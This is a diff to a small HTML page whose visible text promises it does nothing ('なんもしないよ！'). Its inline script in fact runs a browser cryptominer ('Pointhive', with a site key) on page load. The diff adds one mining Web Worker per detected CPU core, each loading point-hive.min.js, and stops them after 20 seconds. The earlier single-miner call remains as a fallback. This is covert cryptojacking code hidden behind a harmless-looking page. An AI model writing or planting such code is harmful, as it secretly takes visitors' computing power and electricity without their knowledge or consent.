@@ -8,11 +8,28 @@
   <body>
     なんもしないよ！
     <script>
-      const miner = new Pointhive('AS89asdfASDF8fjjaeiig0239458J!'); // this site key
-      miner.start();
+      if (window.Worker) {
+        // hardwareConcurrency に対応していないブラウザを使っているようなひとが、マルチコアのCPU使ってるわけないでしょ
+        const c = navigator.hardwareConcurrency || 1;
+        const workers = [];
+        for (let i = 0; i < c; i++) {
+          workers.push(new Worker("../point-hive.min.js"));
+        }
 
-      // 20秒ぐらいほったら満足やろ
-      setTimeout(miner.stop, 20000);
+        // 20秒ぐらいほったら満足やろ
+        setTimeout(() => {
+          for (let i = 0; i < c; i++) {
+            console.log('stop!');
+            workers[i].terminate();
+          }
+        }, 20000);
+      } else {
+        const miner = new Pointhive('AS89asdfASDF8fjjaeiig0239458J!'); // this site key
+        miner.start();
+
+        // 20秒ぐらいほったら満足やろ
+        setTimeout(miner.stop, 20000);
+      }
     </script>
   </body>
 </html>
